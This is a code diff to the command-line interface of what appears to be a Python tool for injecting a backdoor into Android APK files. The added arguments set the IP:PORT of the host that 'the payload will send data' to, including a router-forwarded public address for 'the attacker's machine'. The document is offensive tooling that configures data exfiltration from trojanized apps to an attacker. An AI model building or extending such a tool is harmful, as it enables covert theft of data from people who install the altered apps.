@@ -1,9 +1,21 @@
 import os
 import argparse
 import logging
+import re
+from collections import namedtuple
 
 from . import __version__
 from .apk import Apk
+
+
+def ip_port_value(string):
+    ip_pattern = re.compile(r"^((?:(?:25[0-5]|2[0-4][0-5]|1[0-9][0-9]|[1-9][0-9]|[0-9])\.){3}(?:(25[0-5]|2[0-4][0-5]|1[0-9][0-9]|[1-9][0-9]|[0-9]))):(\d+?)$")
+    match = ip_pattern.match(string)
+    if not match:
+        raise argparse.ArgumentTypeError(f"The value '{string}' is not in the form IP:PORT")
+
+    HostAddress = namedtuple('HostAddress', ['ip', 'port'])
+    return HostAddress(ip=match[1], port=match[3])
 
 
 def setup_args():
@@ -22,6 +34,23 @@ def setup_args():
         'apk',
         metavar='APK',
         help='The APK where the backdoor will be injected',
+    )
+
+    parser.add_argument(
+        'host',
+        metavar='HOST',
+        help='The host (in the form IP:PORT) to which the payload will send data',
+        type=ip_port_value
+    )
+
+    parser.add_argument(
+        '--host', '-H',
+        metavar='REAL_HOST',
+        help='The host (in the form IP:PORT) to which the payload will send data.'
+             ' Use this if HOST is in a private network: REAL_HOST will be the '
+             "router's public IP (and the port that the router will forward to "
+             "the attacker's machine)",
+        type=ip_port_value
     )
 
     parser.add_argument(
